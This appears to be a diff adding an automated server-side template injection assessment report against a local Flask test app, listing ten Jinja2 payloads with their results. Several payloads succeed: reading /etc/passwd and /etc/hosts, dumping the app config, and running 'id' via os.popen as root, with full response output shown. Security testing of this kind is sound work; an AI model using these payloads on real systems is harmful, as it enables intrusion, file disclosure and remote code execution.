@@ -1,0 +1,206 @@
+================================================================================
+SERVER-SIDE TEMPLATE INJECTION VULNERABILITY ASSESSMENT REPORT
+================================================================================
+
+Target: http://localhost:5000
+Scan Date: 2025-08-16 13:16:04
+Total Payloads Tested: 10
+Successful Exploits: 6
+
+EXECUTIVE SUMMARY:
+- Critical Vulnerabilities: 2
+- High Risk Vulnerabilities: 2
+
+DETAILED FINDINGS:
+--------------------------------------------------
+
+Payload: {{ 7*7 }}
+Status: SUCCESS
+Severity: LOW
+Description: Basic arithmetic evaluation test
+Execution Time: 0.004s
+Response Preview: 
+    <html>
+    <head>
+        <title>Template Injection App</title>
+    </head>
+    <body>
+        <h1>Template Injection App</h1>
+        <form method="POST" action="/render">
+            <label for="input">Enter your input:</label>
+            <input type="text" id="input" name="input">
+            <button type="submit">Render</button>
+        </form>
+        <div id="result">Hello, { 49 }!</div>
+    </body>
+    </html>
+    
+
+Payload: {{ ().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__["sys"].exit }}
+Status: FAILED
+Severity: HIGH
+Description: Advanced object traversal for system access
+Execution Time: 0.015s
+
+Payload: {{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
+Status: SUCCESS
+Severity: CRITICAL
+Description: Critical file disclosure vulnerability - /etc/passwd access
+Execution Time: 0.011s
+Response Preview: 
+    <html>
+    <head>
+        <title>Template Injection App</title>
+    </head>
+    <body>
+        <h1>Template Injection App</h1>
+        <form method="POST" action="/render">
+            <label for="input">Enter your input:</label>
+            <input type="text" id="input" name="input">
+            <button type="submit">Render</button>
+        </form>
+        <div id="result">Hello, { root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+ }!</div>
+    </body>
+    </html>
+    
+
+Payload: {{ self.__init__.__globals__.__builtins__.open('/etc/hosts').read() }}
+Status: SUCCESS
+Severity: HIGH
+Description: System file disclosure - /etc/hosts access
+Execution Time: 0.013s
+Response Preview: 
+    <html>
+    <head>
+        <title>Template Injection App</title>
+    </head>
+    <body>
+        <h1>Template Injection App</h1>
+        <form method="POST" action="/render">
+            <label for="input">Enter your input:</label>
+            <input type="text" id="input" name="input">
+            <button type="submit">Render</button>
+        </form>
+        <div id="result">Hello, { 127.0.0.1	localhost
+::1	localhost ip6-localhost ip6-loopback
+fe00::	ip6-localnet
+ff00::	ip6-mcastprefix
+ff02::1	ip6-allnodes
+ff02::2	ip6-allrouters
+172.18.0.2	f720513deb4a
+ }!</div>
+    </body>
+    </html>
+    
+
+Payload: {{ self.__init__.__globals__.__builtins__.__import__('os').environ }}
+Status: FAILED
+Severity: HIGH
+Description: Environment variables disclosure
+Execution Time: 0.012s
+
+Payload: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+Status: SUCCESS
+Severity: CRITICAL
+Description: Remote code execution via system commands
+Execution Time: 0.018s
+Response Preview: 
+    <html>
+    <head>
+        <title>Template Injection App</title>
+    </head>
+    <body>
+        <h1>Template Injection App</h1>
+        <form method="POST" action="/render">
+            <label for="input">Enter your input:</label>
+            <input type="text" id="input" name="input">
+            <button type="submit">Render</button>
+        </form>
+        <div id="result">Hello, { uid=0(root) gid=0(root) groups=0(root)
+ }!</div>
+    </body>
+    </html>
+    
+
+Payload: {{ self.__init__.__globals__.__builtins__.__import__('sys').version }}
+Status: FAILED
+Severity: MEDIUM
+Description: System information disclosure - Python version
+Execution Time: 0.013s
+
+Payload: {{ self.__init__.__globals__.__builtins__.__import__('os').getcwd() }}
+Status: SUCCESS
+Severity: MEDIUM
+Description: Directory traversal - current working directory disclosure
+Execution Time: 0.011s
+Response Preview: 
+    <html>
+    <head>
+        <title>Template Injection App</title>
+    </head>
+    <body>
+        <h1>Template Injection App</h1>
+        <form method="POST" action="/render">
+            <label for="input">Enter your input:</label>
+            <input type="text" id="input" name="input">
+            <button type="submit">Render</button>
+        </form>
+        <div id="result">Hello, { /app }!</div>
+    </body>
+    </html>
+    
+
+Payload: {{ self.__init__.__globals__.__builtins__.__import__('os').listdir('.') }}
+Status: FAILED
+Severity: HIGH
+Description: Directory listing vulnerability
+Execution Time: 0.011s
+
+Payload: {{ config }}
+Status: SUCCESS
+Severity: HIGH
+Description: Flask application configuration disclosure
+Execution Time: 0.010s
+Response Preview: 
+    <html>
+    <head>
+        <title>Template Injection App</title>
+    </head>
+    <body>
+        <h1>Template Injection App</h1>
+        <form method="POST" action="/render">
+            <label for="input">Enter your input:</label>
+            <input type="text" id="input" name="input">
+            <button type="submit">Render</button>
+        </form>
+        <div id="result">Hello, { &amp;lt;Config {&amp;#39;ENV&amp;#39;: &amp;#39;production&amp;#39;, &amp;#39;DEBUG&amp;#39;: False, &amp;#39;TESTING&amp;#39;: False, &amp;#39;PROPAGATE_EXCEPTIONS&amp;#39;: None, &amp;#39;PRESERVE_CONTEXT_ON_EXCEPTION&amp;#39;: None, &amp;#39;SECRET_KEY&amp;#39;: None, &amp;#39;PERMANENT_SESSION_LIFETIME&amp;#39;: datetime.timedelta(days=31), &amp;#39;USE_X_SENDFILE&amp;#39;: False, &amp;#39;SERVER_NAME&amp;#39;: None, &amp;#39;APPLICATION_ROOT&amp;#39;: &amp;#39;/&amp;#39;, &amp;#39;SESSION_COOKIE_NAME&amp;#39;: &amp;#39;session&amp;#39;, &amp;#39;SESSION_COOKIE_DOMAIN&amp;#39;: None, &amp;#39;SESSION_COOKIE_PATH&amp;#39;: None, &amp;#39;SESSION_COOKIE_HTTPONLY&amp;#39;: True, &amp;#39;SESSION_COOKIE_SECURE&amp;#39;: False, &amp;#39;SESSION_COOKIE_SAMESITE&amp;#39;: None, &amp;#39;SESSION_REFRESH_EACH_REQUEST&amp;#39;: True, &amp;#39;MAX_CONTENT_LENGTH&amp;#39;: None, &amp;#39;SEND_FILE_MAX_AGE_DEFAULT&amp;#39;: None, &amp;#39;TRAP_BAD_REQUEST_ERRORS&amp;#39;: None, &amp;#39;TRAP_HTTP_EXCEPTIONS&amp;#39;: False, &amp;#39;EXPLAIN_TEMPLATE_LOADING&amp;#39;: False, &amp;#39;PREFERRED_URL_SCHEME&amp;#39;: &amp;#39;http&amp;#39;, &amp;#39;JSON_AS_ASCII&amp;#39;: True, &amp;#39;JSON_SORT_KEYS&amp;#39;: True, &amp;#39;JSONIFY_PRETTYPRINT_REGULAR&amp;#39;: False, &amp;#39;JSONIFY_MIMETYPE&amp;#39;: &amp;#39;application/json&amp;#39;, &amp;#39;TEMPLATES_AUTO_RELOAD&amp;#39;: None, &amp;#39;MAX_COOKIE_SIZE&amp;#39;: 4093}&amp;gt; }!</div>
+    </body>
+    </html>
+    
+
+================================================================================
+RECOMMENDATIONS:
+- Implement proper input validation and sanitization
+- Use safe template rendering methods
+- Apply the principle of least privilege
+- Consider using sandboxed template engines
+- Regular security assessments and code reviews
+================================================================================
